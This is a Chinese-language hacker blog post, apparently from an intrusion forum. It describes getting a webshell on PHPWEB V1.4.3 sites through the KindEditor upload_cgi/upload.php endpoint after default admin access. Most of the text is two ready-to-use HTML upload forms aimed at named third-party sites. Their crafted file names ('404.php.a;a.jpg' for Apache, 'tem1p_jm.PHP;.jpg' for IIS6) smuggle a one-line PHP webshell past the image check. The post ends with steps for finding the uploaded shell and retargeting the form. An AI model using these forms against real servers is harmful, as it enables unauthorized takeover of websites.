@@ -1,0 +1,97 @@
+PHPWEB  于是默认的进入了后台  不过进去之后拿shell难住了 妹夫的
+
+去百度一下 那个方法失效
+
+版本： V1.4.3 / 20100925
+
+无奈中  于是在刁科的群里面发了一下 问问 phpweb后台拿shell 有方法吗？  一位黑客告诉我EXP  于是我利用了
+
+在刁科论坛找了找看见三石发的这个EXP  于是我就利用 可是不行啊  他那个测试环境：PHP+MySQL+Apache+Linux
+
+我这个是IIS6.0
+
+于是我就把代码改了一下 上传一句话成功
+
+阿帕奇的和IIS的我都发上来 以后看见了 拿shell好利用
+
+IIS我自己改了一下
+——————————————————————————————————————-
+
+<form name="uploadForm" method="post" enctype="multipart/form-data" action="http://yungongchang.net/kedit/upload_cgi/upload.php">
+<input type="hidden" name="fileName" id="fileName" value="404.php.a;a.jpg" />
+<input type="hidden" name="attachPath" id="fileName" value="news/pics/" />
+
+<select id="imageType" onchange="javascript:parent.KindImageType(this.value);document.getElementById(‘KE_IMAGEsubmitButton’).focus();">
+<option value="1" selected="selected">本地</option>
+<option value="2">远程</option>
+</select>
+
+<input type="text" id="imgLink" value="http://" maxlength="255" style="width:95%;border:1px solid #555555;display:none;" />
+<input type="file" name="fileData" id="imgFile" size="14" style="border:1px solid #555555;" onclick="javascript:document.getElementById(‘imgLink’).value=’http://’;" /></td>
+
+<input type="text" name="imgTitle" id="imgTitle" value="" maxlength="100" style="width:95%;border:1px solid #555555;" />
+<input type="text" name="imgWidth" id="imgWidth" value="0" maxlength="4" style="width:40px;border:1px solid #555555;" />
+<input type="text" name="imgHeight" id="imgHeight" value="0" maxlength="4" style="width:40px;border:1px solid #555555;" />
+<input type="text" name="imgBorder" id="imgBorder" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
+<select id="imgAlign" name="imgAlign">
+<option value="">对齐方式</option>
+<option value="baseline">baseline</option>
+<option value="top">top</option>
+<option value="middle">middle</option>
+<option value="bottom">bottom</option>
+<option value="texttop">texttop</option>
+<option value="absmiddle">absmiddle</option>
+<option value="absbottom">absbottom</option>
+<option value="left">left</option>
+<option value="right">right</option>
+</select>
+<input type="text" name="imgHspace" id="imgHspace" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
+<input type="text" name="imgVspace" id="imgVspace" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
+<input type="submit" name="button" id="KE_IMAGEsubmitButton" value="确定" style="border:1px solid #555555;background-color:#AAAAAA;" /></form>
+
+———————————————————————————————————————————————————————-
+
+上面是阿帕奇的
+
+———————————————————————————————————————————————————————-
+
+<form name="uploadForm" method="post" enctype="multipart/form-data" action="http://www.Madman.in/kedit/upload_cgi/upload.php">
+<input type="hidden" name="fileName" id="fileName" value="tem1p_jm.PHP;.jpg" />
+<input type="hidden" name="attachPath" id="fileName" value="news/pics/" />
+
+<select id="imageType" onchange="javascript:parent.KindImageType(this.value);document.getElementById(‘KE_IMAGEsubmitButton’).focus();">
+<option value="1" selected="selected">本地</option>
+<option value="2">远程</option>
+</select>
+
+<input type="text" id="imgLink" value="http://" maxlength="255" style="width:95%;border:1px solid #555555;display:none;" />
+<input type="file" name="fileData" id="imgFile" size="14" style="border:1px solid #555555;" onclick="javascript:document.getElementById(‘imgLink’).value=’http://’;" /></td>
+
+<input type="text" name="imgTitle" id="imgTitle" value="" maxlength="100" style="width:95%;border:1px solid #555555;" />
+<input type="text" name="imgWidth" id="imgWidth" value="0" maxlength="4" style="width:40px;border:1px solid #555555;" />
+<input type="text" name="imgHeight" id="imgHeight" value="0" maxlength="4" style="width:40px;border:1px solid #555555;" />
+<input type="text" name="imgBorder" id="imgBorder" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
+<select id="imgAlign" name="imgAlign">
+<option value="">对齐方式</option>
+<option value="baseline">baseline</option>
+<option value="top">top</option>
+<option value="middle">middle</option>
+<option value="bottom">bottom</option>
+<option value="texttop">texttop</option>
+<option value="absmiddle">absmiddle</option>
+<option value="absbottom">absbottom</option>
+<option value="left">left</option>
+<option value="right">right</option>
+</select>
+<input type="text" name="imgHspace" id="imgHspace" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
+<input type="text" name="imgVspace" id="imgVspace" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
+<input type="submit" name="button" id="KE_IMAGEsubmitButton" value="确定" style="border:1px solid #555555;background-color:#AAAAAA;" /></form>
+
+———————————————————————————————————————————————————————–
+
+这个是IIS6.0的  上传的一句话 (*^__^*) 嘻嘻…… 你懂的  改了一下名称！
+
+上传以后只需要右键查看源代码即可得到上传后的地址
+
+第一行的action改名为真是的kedit地址
+
